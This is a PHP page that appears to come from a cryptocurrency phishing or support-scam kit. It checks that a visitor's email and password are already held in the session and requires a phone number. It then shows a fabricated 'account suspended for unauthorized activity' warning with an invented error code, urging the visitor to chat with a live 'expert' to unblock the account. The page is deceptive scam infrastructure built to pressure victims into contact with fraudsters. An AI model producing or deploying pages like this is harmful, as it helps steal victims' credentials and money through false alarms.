<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Crypto | Account';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="./assets/country-code-picker/css/jquery.ccpicker.css">
        <div class='container-fluid my60'>
            <div class="row">
                <div class="col-sm-12 text-center"></div>
            </div>
            <div class="row justify-content-center">
                <div class="col-sm-4 bg-white rounded-0 shadow-lg text-dark py20 px20 mt60 text-center">
                    <h1 class='h6 mobile_web_font fw-normal text-danger'>Important Message !</h1>
                    <div class="px20 mt30 lh35 text-center">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.</div>
                    <div class='fs18 pt25 text-center fw-semibold'>Error CODE: EBRX1:6X76D</div>
                    <div class="text-center my25">
                        <a href="javascript:void(Tawk_API.toggle())" class="btn btn-primary-2 text-white px20">Ask expert</a>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>